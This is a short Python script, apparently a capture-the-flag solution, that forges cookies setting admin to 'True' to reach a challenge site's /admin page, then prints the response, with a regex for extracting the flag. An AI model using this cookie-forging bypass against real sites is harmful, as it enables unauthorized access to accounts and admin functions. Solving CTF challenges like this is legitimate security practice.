import requests
import re

params = {'user': 'A', 'password': 'A', 'submit': 'Sign In'}
jar = {'admin': 'True', 'password': '', 'username': ''}

r = requests.get('https://xmas.2020.chall.actf.co/admin', data=params, cookies=jar)
source = r.text
print source
#print re.findall(r'(actf\{.+\})', source)[0]
